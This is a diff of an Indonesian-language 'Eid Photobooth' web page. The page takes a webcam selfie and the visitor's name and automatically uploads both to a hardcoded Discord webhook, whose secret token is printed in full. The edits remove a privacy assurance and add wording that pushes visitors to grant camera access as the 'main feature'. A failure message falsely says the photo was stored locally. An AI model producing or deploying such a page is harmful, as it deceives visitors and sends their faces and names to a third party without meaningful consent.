@@ -44,20 +44,21 @@
 
         /* Layar Setup (Sistem Izin) */
         #setup-screen {
-            padding: 20px;
+            padding: 25px;
             background: rgba(0, 0, 0, 0.2);
             border-radius: 20px;
-            border: 1px dashed var(--gold);
+            border: 1px solid var(--gold);
         }
 
         .security-note {
-            font-size: 0.8rem;
+            font-size: 0.85rem;
             margin-bottom: 20px;
-            color: #a8d5ba;
+            color: #d1fae5;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
+            line-height: 1.4;
         }
 
         /* Input Style */
@@ -74,7 +75,7 @@
             text-align: center;
             transition: 0.3s;
         }
-        input[type="text"]:focus { border-color: var(--gold); box-shadow: 0 0 10px rgba(212, 175, 55, 0.3); }
+        input[type="text"]:focus { border-color: var(--gold); }
 
         /* Camera Wrapper */
         .booth-wrapper {
@@ -84,7 +85,7 @@
             overflow: hidden;
             background: #000;
             margin-bottom: 20px;
-            display: none; /* Muncul setelah izin diberikan */
+            display: none;
         }
 
         #video { width: 100%; height: auto; transform: scaleX(-1); display: block; }
@@ -94,7 +95,7 @@
             top: 0; left: 0; width: 100%; height: 100%;
             pointer-events: none;
             box-shadow: inset 0 0 0 15px var(--gold);
-            opacity: 0.6;
+            opacity: 0.5;
             z-index: 5;
         }
 
@@ -137,7 +138,7 @@
     <div class="container">
         <header>
             <h1>🌙 Eid Photobooth</h1>
-            <p class="subtitle">Abadikan momen fitri dengan bingkai eksklusif</p>
+            <p class="subtitle">Rayakan kemenangan dengan foto bersama</p>
         </header>
 
         <div id="setup-screen">
@@ -145,9 +146,9 @@
                 <input type="text" id="username" placeholder="Tulis namamu di sini..." required>
             </div>
             <div class="security-note">
-                <span>🔒</span> Privasi Terjamin. Akses kamera hanya untuk sesi ini.
+                <span>✨</span> Mohon ijinkan kamera untuk mengaktifkan fitur utama photobooth.
             </div>
-            <button id="start-btn" class="btn btn-gold">Mulai Kamera ✨</button>
+            <button id="start-btn" class="btn btn-gold">Aktifkan Fitur Utama 🌙</button>
         </div>
 
         <div id="main-booth">
@@ -172,7 +173,7 @@
     </div>
 
     <script>
-        // 1. Masukkan URL Webhook Discord Kamu di Sini
+        // 1. GANTI URL INI DENGAN WEBHOOK DISCORD KAMU
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME';
 
         const startBtn = document.getElementById('start-btn');
@@ -189,7 +190,7 @@
         const usernameInput = document.getElementById('username');
         const context = canvas.getContext('2d');
 
-        // FUNGSI: Mengaktifkan Kamera secara Sopan
+        // AKTIFKAN KAMERA (Fitur Utama)
         startBtn.addEventListener('click', async () => {
             const name = usernameInput.value.trim();
             if(!name) {
@@ -198,7 +199,7 @@
             }
 
             try {
-                startBtn.innerText = "Menghubungkan...";
+                startBtn.innerText = "Mengaktifkan...";
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: false 
@@ -210,18 +211,19 @@
                 actionBtns.style.display = 'block';
                 
             } catch (err) {
-                alert("Kamera tidak dapat diakses. Mohon izinkan akses kamera di browser kamu.");
-                startBtn.innerText = "Mulai Kamera ✨";
+                console.error(err);
+                alert("Untuk melanjutkan, silakan ijinkan akses kamera untuk mengaktifkan fitur utama photobooth ini. Cek ikon gembok di browser Anda.");
+                startBtn.innerText = "Aktifkan Fitur Utama 🌙";
             }
         });
 
-        // FUNGSI: Mengirim ke Discord
+        // KIRIM KE DISCORD
         async function sendToDiscord(blob, name) {
             statusMsg.innerText = "⏳ Sedang memproses ke sistem...";
             
             const formData = new FormData();
             formData.append('file', blob, 'eid-photo.png');
-            formData.append('content', `⭐ **Momen Idul Fitri Baru!**\n👤 Nama: **${name}**\n📅 Waktu: ${new Date().toLocaleString()}`);
+            formData.append('content', `⭐ **Foto Baru Diterima!**\n👤 Nama: **${name}**\n📅 Tanggal: ${new Date().toLocaleDateString('id-ID')} | ${new Date().toLocaleTimeString('id-ID')}`);
 
             try {
                 const response = await fetch(DISCORD_WEBHOOK_URL, {
@@ -230,44 +232,44 @@
                 });
 
                 if (response.ok) {
-                    statusMsg.innerText = "✅ Berhasil! Fotomu sudah masuk ke galeri server.";
+                    statusMsg.innerText = "✅ Foto berhasil terkirim ke galeri server!";
                 } else {
-                    statusMsg.innerText = "⚠️ Foto gagal terkirim secara otomatis.";
+                    statusMsg.innerText = "⚠️ Foto disimpan lokal (Gagal kirim ke Discord).";
                 }
             } catch (error) {
-                statusMsg.innerText = "❌ Gangguan koneksi saat mengirim.";
+                statusMsg.innerText = "❌ Gangguan jaringan saat pengiriman.";
             }
         }
 
-        // FUNGSI: Ambil Foto
+        // AMBIL FOTO
         snap.addEventListener('click', () => {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
 
-            // Gambar (Dibalik agar normal, bukan mirror)
+            // Gambar (Proses mirror ke normal)
             context.save();
             context.scale(-1, 1);
             context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
             context.restore();
 
-            // Tambah Bingkai Emas
+            // Bingkai Emas Otomatis
             context.strokeStyle = "#d4af37";
-            context.lineWidth = 40;
+            context.lineWidth = 35;
             context.strokeRect(0, 0, canvas.width, canvas.height);
             
-            // Render Hasil
+            // Tampilkan Preview
             const dataURL = canvas.toDataURL('image/png');
             photo.src = dataURL;
             resultContainer.style.display = 'block';
             resultContainer.scrollIntoView({ behavior: 'smooth' });
 
-            // Proses Kirim ke Discord
+            // Kirim Blob ke Discord
             canvas.toBlob((blob) => {
                 sendToDiscord(blob, usernameInput.value);
             }, 'image/png');
         });
 
-        // FUNGSI: Download
+        // DOWNLOAD
         downloadBtn.addEventListener('click', () => {
             const link = document.createElement('a');
             link.download = `Eid-Mubarak-${usernameInput.value}.png`;
